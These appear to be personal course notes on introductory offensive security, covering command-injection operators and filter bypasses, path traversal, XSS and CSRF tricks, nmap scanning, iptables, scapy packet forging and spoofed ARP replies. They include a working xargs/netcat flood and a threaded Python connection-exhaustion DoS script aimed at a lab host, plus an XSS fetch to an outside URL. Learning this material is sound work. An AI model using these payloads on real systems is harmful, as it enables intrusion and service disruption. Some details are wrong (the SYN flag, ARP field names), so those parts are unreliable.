# Intro To CyberSecurity

## Web Security
`curl --path-as-is`: curl normally squashes input like `../../etc/passwd` This avoids that

Valid command injection operators:

|name|operator|
| ------- | ------ |
| semicolon | `;` |
| newline | `\n` |
| background | `&` |
| pipe | `\|` |
| and | `&&` |
| or | `\|\|` |
| subshell | `` `command-string` `` |
| subshell | `$(command-string)` |

Other tricks:

 - Whitespaces. Can use tabs if spaces are blocked. URLs take `+` for spaces (eg. `curl+\flag`). `${IFS}` (internal field separator)
 - special characters, such as the list above. URLs can take ascii but with a percentage. eg newline 0x0a --> %0a

### XSS
Here's a fetch in javascript making a post request
```js
<script>
	const url ="http://somewhere.com";
	const options = {method:"POST"};
	fetch(url,options)
</script>
```
### Cross Site Forgerty Requests (CSFR)
 - Redirects preserve headers, so a simple get requests can be accomplished by setting a redirect. If it comes from the site of interest, then authentication cookies would still be present and there's no problems with Cross-Origin Request Sharing (CORS).
 - HTML predates JS (and their associated seurity rules) and so CORS restrictions do not apply there, for instance with forms (and a post request made from it)
 
## Intercepting Communication
 - subnetting. For an ip address eg. 192.168.10.0 (32 bits total), this is a particular device, the network (such as a school, home, etc) will have the same higher bits (32 bits total). Larger organizations need more devices and so allocate less for the subnet. The subnet is given by a mask of 1's. For instance `11111111.11111111.11111111.00000000` or `255.255.255.0` specifies the top 24 bits are all the network and the lower 8 bits can just be represented with a `/24`. So `192.168.10.4/24` for instance. This means this network can support 254 unique devices (not 256 as it 0-255, because the first and last, 0 and 255 are reserved for special purposes).
 - Scanning a port? Without nmap it can be done in bash:
 ```bash
 for i in $(seq 0 255); do
	ping -c 1 -q 10.0.0.$i; 
 done
 ```
 - `nmap` Scanning a large number of machines on a specific port can be done simply with `nmap ip.add.re.ss/16 -p port`. But to make it faster, you can do something like: `nmap ip.add.re.ss/16 -p port -n -Pn --min-rate 5000`
 	- `-n` **n**o DNS resolution. If you only care about raw ip addresses and not website they may represent
	- `-Pn` **n**o **p**ing/host discovery. nmap pings first to see if a host is online. A firewall may block it and nmap retries, wasting time, `Pn` assumes they're all active and just probes the port
	- `--min-rate <packets-per-sec>` Can easily be pushed to 10000 or perhaps higher in a local container/VM
	- Industry standard workflow is 2 stage. 1. discovery (as above), 2. targeted scan `nmap ip.add.re.ss -p port -A`
### **Network Configuration** (link layer)
See how your computer is connected with the `ip addr show` command (replaces the older `ifconfig`). Can be shortened to `ip addr` or even `ip a` if you're just trying to see it, but any longer commands need the full thing written out, such as the examples to follow. Output might look like:
```
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet 10.255.255.254/32 brd 10.255.255.254 scope global lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 00:15:5d:db:07:93 brd ff:ff:ff:ff:ff:ff
    inet 172.25.202.131/20 brd 172.25.207.255 scope global eth0
       valid_lft forever preferred_lft forever
    inet6 fe80::215:5dff:fedb:793/64 scope link
       valid_lft forever preferred_lft forever
3: docker0: <NO-CARRIER,BROADCAST,MULTICAST,UP> mtu 1500 qdisc noqueue state DOWN group default
    link/ether f2:da:54:d9:35:d6 brd ff:ff:ff:ff:ff:ff
    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0
       valid_lft forever preferred_lft forever
```
Various interfaces are shown `lo`, `eth`, `docker` above and also `wlo` are usual. `lo` is loopback (yourself), `wlo#` is wifi, `eth#` is the ethernet (virtual machines show up as an ethernet such as the above example). Other things like docker may be available. The interfaces can be turned on or off with `ip addr link set wlo1 <down|up>`. If you mess something up (eg. take down the ip of something running and put up a non-functioning ip), bringing an interface down and back up should reset it.

you can add or remove ip addresses (you must specify the device/interface) with `ip addr <add|del> 192.168.0.25/24 dev wlo1`

### firewall
helpful videos: [1](https://www.youtube.com/watch?v=6Ra17Qpj68c)
- Check if it's up `sudo ufw status` (FUN FACT: ufw stands for "uncomplicated firewall")
- Enable or disable `sudo ufw <enable|disable>`
- `iptables` will display the firewall informaiton, `-L` will **L**ist the firewall rules `-n` for **n**o DNS lookups and `-v` for **v**erbose. There are many "tables"	and "chains" (filter table, NAT table, MANGLE table), the most basic is the filter table which deals with INPUT, OUTPUT and REDIRECT. You can change the policy to accept or drop by default: `iptables --policy INPUT ACCEPT/DROP`.
- Overall patterb for iptables command with most rule changes: `iptables -A/-I INPUT/OUTPUT/REDIRECT -s <source_up> -j ACCEPT/DROP` (`-A` append to end, `-I` insert at front)
- To block or allow from a particular IP address: `iptables -I INPUT -s 10.0.0.1 -j DROP` (`-s` source `-j` jump (sets the target of the action). A subnet can be specified (eg. `10.0.0.1/24`)
- To block on a particular port: `iptables -I INPUT -p tcp --dport 80 -j DROP` (`-p` **p**rotocol `--dport` desination port specified in request)
- combine them for a particular IP on a particular port: `iptables -I INPUT -p tcp --dport 80 -s 10.0.0.1 -j ACCEPT`
- Deleting a rule. You can list them to include line number (`iptables -L --line-numbers`) and then specify the rule you don't want (eg. `iptables -D INPUT 1` to delete whatever is listed as rule 1)
- Save a particular configuration: `/sbin/iptables-save`. Clear/flush one: `iptables -F`

### Denial of Service
This can simply be done by netcatting to a resource because it makes a TCP connection. But a more sophisticated attack would involve forking or xargs (which can run a specified number of processes in parallel).

- `xargs`. Useful for programs which won't read from standard input. See [summary video](https://www.youtube.com/watch?v=rp7jLi_kgPg). But in essence:
	- `seq 50 | echo` (does nothing because echo doesn't read from stdin)
	- `seq 50 | xargs echo` (will echo 1 - 50)
	- use `-I SYMBOL` to do something with that input eg. `seq 50 | xargs -I {} touch {}.txt` (makes `1.txt` through `150.txt`). the symbol can be anything, but `{}` is just standard choice.
	- how to DOS with xargs: `seq 50 | xargs -P 50 -I {} nc 10.0.0.2 1337` (`-P` sets the number of parallel processes)

The problem with using `xargs` and netcalt is that you're opening program resources on your end so it boils down to who has more resources. Often a personal computer will lost against a server. A simple socket connection will take resources but not too many compared to spawning a new program like netcat. It can be done with multiprocessing or multithreading (it turns out multithreading has a higher upper limit) as follows:
```python
import socket
#from multiprocessing import Process
import threading

def connect():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(("10.0.0.2",31337))
        s.setsockopt(socket.SO_KEEPALIVE)
    except:
        pass

while True:
    t = threading.Thread(target=connect)
    t.start()
    #p = Process(target=connect)
    #p.start()
```

How to know this that multithreading is more effective than multiprocessing? Monitor using `ss` (socket statistics)
`watch -n 0.1 ss -s` will monitor and update every 0.1 seconds. multithreading topped off around 1200 connections while multiprocessing barely made 100. Why? a process in python spins up an entirely separate python interpretor. This is large RAM overhead. Threads share the same memory space and spawning a new one takes up very little memory and it occurs quickly. 

### manual creation of packets (using scapy)
Be it IP, ethernet, TCP, UDP, scapy can send packets, such as what you would see over wireshark. These are fake packets. scapy can be used in a IDE mode by typing `scapy` into the terminal and the packets can be initialized and any attributes can be set using dot notation (note, any python commands can also be done because it's combined with the python interpreter):
```
>>> scapy
>>> p = IP(ttl=64) #ttl = time to live, 64 is set by default I believe
>>> p.src="10.0.0.1"
>>> p.dst="10.0.0.2"
>>> p.another_attribute="whatever you want"
>>> send(p) # send() sends on layer 3, which is the network layer (IP)
```
To see the valid list of commands, use `lsc()` (for "list commands") within the scapy interpreter. Packet types can be: `IP`, `Ether`, `TCP`, `UDP`

The IP protocol is encapsulated by Ethernet and so making and sending an ethernet packet as above requires this explicity placement:
```
>>> p = Ether() / IP()
>>> p[IP].src="10.0.0.1"
>>> p[IP].dst="10.0.0.2"
>>> sendp(p)  # sendp() instead of send() will send on layer 2, the data link layer (MAC addresses used here like on your wifi router or ethernet)
```
In general the OSI layer is structured like this:
```
application layer (http, tsl, dns)
transport layer (tcp, udp)
network layer (ip)
link layer (ethernet, wlan)
```
and so we need to write in order of "outer to inner". The link layer encapsulates (contains) everything within it `Ether() / IP() / TCP()` for instance is the correct ordering

### TCP handshake
In a TCP handshake, we initialize a random sequence number (and send an 'S' flag for "syn"). The response will be a "synack" which will include the initial number incremented by 1 in its ack field, as well as it's own randomly set sequence number (and an 'SA' flag for the "synack"). Finally, an ack response is required which will return the same incremented sequence number received in the seq field and an incremented ack of the message response (and an "A" flag set for "ack"):
```
HOST A                                                  HOST B
       ------Syn (seq=A, flags='A') ------------------>
       <-----Synack (seq=B, ack=A+1, flags='SA' -------
	   ------Ack (seq=A+1, ack=B+1, flags='A' -------->
```
in scapy, this can be accomplished as:

```
>>> ip = IP(dst="10.0.0.2")
>>> SYN = TCP(sport=31337,dport=31337, seq=31337, flags='S')
>>> SYNACK = sr1(ip/SYN)
>>> ACK = TCP(sport=31337,dport=31337,seq=31338, ack=SYNACK[TCP].seq+1, flags='A')
>>> send(ip/ACK)
```

### UDP
Sending UDP message from python is simple from the socket library. The message being sent needs to be a byte string
```python
import socket

ip = "10.0.0.2"
port = 42
msg = b"message out"

s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.sendto(msg, (ip,port))
dat, addr = s.recvfrom(1024)
print(f"received from {addr} : {dat}")
```

### ARP
(address resolution protocol), this maps an ipv4 address to a MAC address. It's built on top of layer 2 (data link like Ethernet). It can take these args: `ARP(hwsrc, hwdst, psrc, pdst,op)`.(hardware src/dst and port src/dst). Its function depends on the op code supplied in the message:
 - `1`: will ask "who-has"? (i.e. who has ip X? tell me your MAC)
 - `2`: is the reply `is-at` (i.e. MAC address X is at ip Y)


Routers and switches will even send a gratuitous op 2 without being asked. This way other routers or whatever can update their internal ARP caches and update their mapping.


`arp_pkt = Ether()/ARP(hwsrc='th:is:MAC:ad:dr:ess', psrc='is.at.this.ip', pdst='who.im.tell.ing', op=2)`
